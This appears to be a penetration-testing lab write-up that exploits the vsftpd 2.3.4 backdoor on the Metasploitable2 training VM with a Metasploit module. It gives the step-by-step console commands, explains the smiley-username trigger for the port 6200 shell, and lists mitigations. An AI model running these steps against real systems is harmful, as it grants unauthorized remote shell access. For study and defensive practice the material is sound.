###  Practical: Exploiting Metasploitable2 (vsftpd 2.3.4 Backdoor)

#### Overview

**Metasploitable2** is an intentionally vulnerable virtual machine used for learning and practicing penetration testing techniques.  
One of the vulnerable services running on Metasploitable2 is **vsftpd version 2.3.4**, which contains a **backdoor vulnerability** that allows attackers to gain unauthorized shell access.

This exploitation is performed in a **controlled lab environment** for educational and ethical purposes only.

---

#### Vulnerability Explanation

The **vsftpd 2.3.4 backdoor vulnerability** was introduced due to a malicious modification in the source code.  
When a specially crafted username containing a smiley (`:)`) is used during FTP login, the service opens a backdoor shell on **TCP port 6200**, allowing remote command execution.

---

#### Exploitation Steps Using Metasploit

##### Step 1: Launch Metasploit Framework

```bash
msfconsole
```

This command starts the Metasploit Framework console, which provides access to exploit modules, payloads, and post-exploitation tools.

---

##### Step 2: Search for the vsftpd Exploit

```bash
search vsftpd
```

This command searches Metasploitâ€™s database for exploit modules related to the **vsftpd** service.

---

##### Step 3: Load the Exploit Module

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

This command loads the exploit module specifically designed to target the **vsftpd 2.3.4 backdoor vulnerability**.

---

##### Step 4: Configure the Target System

```bash
set RHOSTS 192.168.56.102
```

- `RHOSTS` specifies the IP address of the vulnerable target machine (Metasploitable2).
- Ensure the attacker and target machines are connected to the same network.

---

##### Step 5: Execute the Exploit

```bash
run
```

This command executes the exploit against the target system.  
If successful, a shell session is opened, granting command-line access to the target machine.

---

#### Result

- Unauthorized shell access is obtained  
- The attacker can now execute commands on the target system  
- This confirms the presence of the vulnerability

---

#### Security Impact

- Allows **remote command execution**
- Can lead to **complete system compromise**
- Enables privilege escalation or lateral movement

---

#### Mitigation & Prevention

- Upgrade **vsftpd** to a secure version
- Disable unnecessary FTP services
- Restrict access using firewalls
- Apply regular system patches and updates

---
